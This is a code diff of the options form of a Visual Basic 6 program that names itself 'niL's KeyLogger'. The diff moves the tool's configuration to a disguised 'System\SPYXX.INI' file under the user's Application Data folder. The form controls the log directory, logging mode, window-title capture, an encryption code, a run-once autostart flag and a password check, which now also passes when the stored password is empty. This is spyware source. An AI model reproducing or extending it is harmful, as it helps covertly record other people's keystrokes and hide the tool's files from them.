@@ -16,7 +16,38 @@ Begin VB.Form frmOptions
    ScaleHeight     =   5925
    ScaleWidth      =   5655
    ShowInTaskbar   =   0   'False
-   StartUpPosition =   2  'CenterScreen
+   StartUpPosition =   1  'CenterOwner
+   Begin VB.Frame Frame3 
+      Appearance      =   0  'Flat
+      BackColor       =   &H00404040&
+      BorderStyle     =   0  'None
+      ForeColor       =   &H80000008&
+      Height          =   3135
+      Left            =   2880
+      TabIndex        =   36
+      Top             =   1200
+      Visible         =   0   'False
+      Width           =   2535
+      Begin VB.DirListBox Dir1 
+         Appearance      =   0  'Flat
+         BackColor       =   &H00000000&
+         ForeColor       =   &H00FFFFFF&
+         Height          =   2565
+         Left            =   120
+         TabIndex        =   38
+         Top             =   480
+         Width           =   2295
+      End
+      Begin VB.DriveListBox Drive1 
+         BackColor       =   &H00000000&
+         ForeColor       =   &H00FFFFFF&
+         Height          =   315
+         Left            =   120
+         TabIndex        =   37
+         Top             =   120
+         Width           =   2295
+      End
+   End
    Begin VB.TextBox Text3 
       Alignment       =   2  'Center
       BeginProperty Font 
@@ -36,6 +67,7 @@ Begin VB.Form frmOptions
       TabStop         =   0   'False
       Text            =   "password"
       Top             =   2520
+      Visible         =   0   'False
       Width           =   2895
    End
    Begin VB.Frame Frame2 
@@ -43,8 +75,8 @@ Begin VB.Form frmOptions
       Height          =   1575
       Left            =   0
       TabIndex        =   30
-      Top             =   600
-      Width           =   5535
+      Top             =   1800
+      Width           =   5655
       Begin VB.TextBox txtPwd 
          BackColor       =   &H00404040&
          BeginProperty Font 
@@ -65,6 +97,17 @@ Begin VB.Form frmOptions
          TabIndex        =   0
          Top             =   600
          Width           =   2535
+      End
+      Begin VB.Label lblNote 
+         Alignment       =   2  'Center
+         BackStyle       =   0  'Transparent
+         Caption         =   "Setting will be applied after Restart."
+         ForeColor       =   &H00808080&
+         Height          =   255
+         Left            =   360
+         TabIndex        =   39
+         Top             =   1200
+         Width           =   5055
       End
       Begin VB.Label Label7 
          BackStyle       =   0  'Transparent
@@ -121,7 +164,7 @@ Begin VB.Form frmOptions
       Caption         =   "Logging Mode"
       Enabled         =   0   'False
       ForeColor       =   &H00FFFFFF&
-      Height          =   1995
+      Height          =   2115
       Left            =   120
       TabIndex        =   25
       Top             =   3120
@@ -131,7 +174,7 @@ Begin VB.Form frmOptions
          Caption         =   "Everyday New Logfile"
          BeginProperty Font 
             Name            =   "Arial"
-            Size            =   11.25
+            Size            =   9
             Charset         =   0
             Weight          =   400
             Underline       =   0   'False
@@ -150,7 +193,7 @@ Begin VB.Form frmOptions
          Caption         =   "Only One Logfile."
          BeginProperty Font 
             Name            =   "Arial"
-            Size            =   11.25
+            Size            =   9
             Charset         =   0
             Weight          =   400
             Underline       =   0   'False
@@ -169,7 +212,7 @@ Begin VB.Form frmOptions
          Caption         =   "New Logfile on each LogOn. (Recommended)"
          BeginProperty Font 
             Name            =   "Arial"
-            Size            =   11.25
+            Size            =   9
             Charset         =   0
             Weight          =   400
             Underline       =   0   'False
@@ -183,7 +226,8 @@ Begin VB.Form frmOptions
          Top             =   240
          Width           =   4815
       End
-      Begin VB.TextBox Text1 
+      Begin VB.TextBox txtLogDir 
+         Alignment       =   2  'Center
          BackColor       =   &H00C0C0C0&
          BorderStyle     =   0  'None
          BeginProperty Font 
@@ -198,7 +242,7 @@ Begin VB.Form frmOptions
          Height          =   285
          Left            =   2280
          TabIndex        =   11
-         Top             =   1080
+         Top             =   1200
          Width           =   3015
       End
       Begin VB.TextBox Text2 
@@ -217,7 +261,7 @@ Begin VB.Form frmOptions
          Left            =   2280
          MaxLength       =   5
          TabIndex        =   12
-         Top             =   1440
+         Top             =   1560
          Width           =   3015
       End
       Begin VB.Label Label5 
@@ -236,7 +280,7 @@ Begin VB.Form frmOptions
          Height          =   255
          Left            =   960
          TabIndex        =   32
-         Top             =   1800
+         Top             =   1920
          Width           =   3735
       End
       Begin VB.Label Label3 
@@ -255,7 +299,7 @@ Begin VB.Form frmOptions
          Height          =   255
          Left            =   240
          TabIndex        =   27
-         Top             =   1080
+         Top             =   1200
          Width           =   1935
       End
       Begin VB.Label Label4 
@@ -274,7 +318,7 @@ Begin VB.Form frmOptions
          Height          =   255
          Left            =   240
          TabIndex        =   26
-         Top             =   1440
+         Top             =   1560
          Width           =   2055
       End
    End
@@ -388,7 +432,7 @@ Begin VB.Form frmOptions
          _ExtentY        =   450
          _Version        =   393216
          LargeChange     =   2
-         Min             =   -8
+         Min             =   -10
          Max             =   30
       End
       Begin VB.Label Label9 
@@ -583,34 +627,42 @@ Attribute VB_Creatable = False
 Attribute VB_PredeclaredId = True
 Attribute VB_Exposed = False
 'username import function
-Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
+Private Declare Function getusername Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
 
-'Get system directory part
-Private Declare Function GetSystemDirectory Lib "kernel32" Alias _
-"GetSystemDirectoryA" (ByVal lpBuffer As String, _
-ByVal nSize As Long) As Long
-
-Dim sDr As String
 
 Dim pwdcorrect As Boolean
 
-Private Sub Check3_Click()
+Private Sub Check3_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
 If Check3.Value = vbChecked Then
-frmTitles.Show
-
+'frmTitles.Show
+Call frmMain.LoadTitles
+frmMain.fraTitles.Visible = True
 End If
+End Sub
+
+Private Sub Dir1_Change()
+txtLogDir.Text = Dir1.Path
+End Sub
+
+Private Sub Drive1_Change()
+On Error GoTo err
+Dir1.Path = Drive1.Drive
+err:
+If err.Number <> 0 Then Frame3.Visible = False: Call loadsettings
 End Sub
 
 
 
 Private Sub Form_Load()
-    
+Call GetUname
     'center the form
     Me.Move (Screen.Width - Me.Width) / 2, (Screen.Height - Me.Height) / 2
 
-Call loadusersDr
-If Dir(sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini") <> "" Then
+
+If Dir("C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI") <> "" Then
     txtPwd = frmMain.upwd.Text 'Use main forms password here
+    txtLogDir.Text = INIRead("LogSetting", "LogDir", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
+    txtLogDir.Visible = False
     Call txtPwd_Change
 Else
     MsgBox "niL's KeyLogger have not been configured !", vbCritical
@@ -620,19 +672,20 @@ End Sub
 
 Public Sub loadsettings()
 
-    Check2.Value = INIRead("LogSetting", "USEBS", sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini")
-    Check1.Value = INIRead("LogSetting", "UseChildTitle", sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini")
-    Slider1.Value = INIRead("LogSetting", "EncCode", sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini")
-    Text2.Text = INIRead("LogSetting", "extension", sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini")
-    Slider2.Value = INIRead("LogSetting", "TimerInt", sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini")
-    Text1.Text = INIRead("LogSetting", "LogDir", sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini")
-    txtNPwd.Text = INIRead("LogSetting", "Pwd", sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini")
-    Check4.Value = INIRead("LogSetting", "SETRUNONCE", sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini")
-    Check3.Value = INIRead("LogSetting", "sLogging", sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini")
+    txtLogDir.Visible = True
+    Check2.Value = INIRead("LogSetting", "USEBS", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
+    Check1.Value = INIRead("LogSetting", "UseChildTitle", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
+    Slider1.Value = INIRead("LogSetting", "EncCode", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
+    Text2.Text = INIRead("LogSetting", "extension", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
+    Slider2.Value = INIRead("LogSetting", "TimerInt", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
+    txtLogDir.Text = INIRead("LogSetting", "LogDir", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
+    txtNPwd.Text = INIRead("LogSetting", "Pwd", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
+    Check4.Value = INIRead("LogSetting", "SETRUNONCE", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
+    Check3.Value = INIRead("LogSetting", "sLogging", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
 
 
     Dim logmode As Integer
-    logmode = INIRead("LogSetting", "LogMode", sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini")
+    logmode = INIRead("LogSetting", "LogMode", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
     Select Case logmode
     Case 0
     Option1.Value = True
@@ -645,25 +698,32 @@ Public Sub loadsettings()
 End Sub
 
 Private Sub cmdApply_Click()
+On Error GoTo err
+Dir1.Path = txtLogDir.Text
 
-IniWrite "LogSetting", "USEBS", Check2.Value, sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini"
-IniWrite "LogSetting", "UseChildTitle", Check1.Value, sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini"
-IniWrite "LogSetting", "EncCode", Slider1.Value, sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini"
-IniWrite "LogSetting", "extension", Text2.Text, sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini"
-IniWrite "LogSetting", "TimerInt", Slider2.Value, sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini"
-IniWrite "LogSetting", "LogDir", Text1.Text, sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini"
-IniWrite "LogSetting", "Pwd", encrypt(txtNPwd.Text, 10), sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini"
-IniWrite "LogSetting", "SETRUNONCE", Check4.Value, sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini"
-IniWrite "LogSetting", "sLogging", Check3.Value, sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini"
+If Right(txtLogDir.Text, 1) = "\" Then txtLogDir.Text = Mid(txtLogDir.Text, 1, Len(txtLogDir) - 1)
+
+IniWrite "LogSetting", "USEBS", Check2.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
+IniWrite "LogSetting", "UseChildTitle", Check1.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
+IniWrite "LogSetting", "EncCode", Slider1.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
+IniWrite "LogSetting", "extension", Text2.Text, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
+IniWrite "LogSetting", "TimerInt", Slider2.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
+IniWrite "LogSetting", "LogDir", txtLogDir.Text, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
+IniWrite "LogSetting", "Pwd", encrypt(txtNPwd.Text, 10), "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
+IniWrite "LogSetting", "SETRUNONCE", Check4.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
+IniWrite "LogSetting", "sLogging", Check3.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
 
 If Option1.Value = True Then
-IniWrite "LogSetting", "LogMode", "0", sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini"
+IniWrite "LogSetting", "LogMode", "0", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
 ElseIf Option2.Value = True Then
-IniWrite "LogSetting", "LogMode", "1", sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini"
+IniWrite "LogSetting", "LogMode", "1", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
 ElseIf Option3.Value = True Then
-IniWrite "LogSetting", "LogMode", "2", sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini"
+IniWrite "LogSetting", "LogMode", "2", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
 End If
 
+
+err:
+If err.Number = 76 Then MsgBox "Path not Available! Settings not saved.", vbCritical: Call loadsettings
 End Sub
 Private Function encrypt(givenText As String, eCode As Integer)
 Dim i As Integer
@@ -677,12 +737,21 @@ Private Sub cmdCancel_Click()
 End Sub
 
 Private Sub cmdOK_Click()
-
-MsgBox "Changes will take effect in next session.", vbInformation
 Call cmdApply_Click
 Unload Me
 End Sub
 
+
+
+Private Sub Frame1_Click()
+Frame3.Visible = False
+End Sub
+
+
+
+Private Sub fraSample1_Click()
+Frame3.Visible = False
+End Sub
 
 
 Private Sub Slider1_Click()
@@ -693,10 +762,27 @@ Private Sub Slider2_Change()
 If Slider2.Value < 10 Then MsgBox "Very Low.": Slider2.Value = 10
 End Sub
 
-Private Sub Text3_Change()
+Private Sub txtLogDir_Change()
+On Error Resume Next
+Dir1.Path = txtLogDir.Text
+Drive1.Drive = txtLogDir.Text
+End Sub
+
+
+Private Sub txtLogDir_Click()
+
+If Frame3.Visible = True Then
+Frame3.Visible = False
+Else
+Frame3.Visible = True
+End If
+End Sub
+
+Private Sub Text3_Click()
 Text3.Visible = False
 txtNPwd.Text = ""
 txtNPwd.SetFocus
+
 End Sub
 
 Private Sub txtNPwd_Change()
@@ -704,36 +790,32 @@ Label8.Visible = True
 End Sub
 
 Private Sub txtPwd_Change()
-Call loadusersDr
-If Dir(sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini") <> "" Then
+
+If Dir("C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI") <> "" Then
     Dim pwd As String
-    pwd = INIRead("LogSetting", "Pwd", sDr & "\Users\" & Username & "\AppData\Roaming\Microsoft\setting.ini")
-    If encrypt(Left(pwd, Len(pwd) - 1), -10) = txtPwd.Text Then
-        Call loadusersDr
+    pwd = INIRead("LogSetting", "Pwd", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
+    If encrypt(Left(pwd, Len(pwd) - 1), -10) = txtPwd.Text Or encrypt(Left(pwd, Len(pwd) - 1), -10) = "" Then
+
         Call loadsettings
         cmdApply.Enabled = True
         cmdOK.Enabled = True
         fraSample1.Enabled = True
         Frame1.Enabled = True
         Frame2.Visible = False
+        Text3.Visible = True
     End If
 Else
  Unload Me
 End If
 End Sub
-Private Sub loadusersDr()
- 'Get sysDirectory
-    Dim SysDir As String
-    SysDir = String(80, 0)
-    Call GetSystemDirectory(SysDir, 80)     'stores global variable sysDir i.e, system32 path.                'Get system drive
-    sDr = Left(SysDir, 2)
+Private Sub GetUname()
 
 'get username
 Dim sBuffer As String
     Dim lSize As Long
     sBuffer = Space$(255)
     lSize = Len(sBuffer)
-    Call GetUserName(sBuffer, lSize)
+    Call getusername(sBuffer, lSize)
 If lSize > 0 Then
         Username = Left$(sBuffer, lSize)
 Else
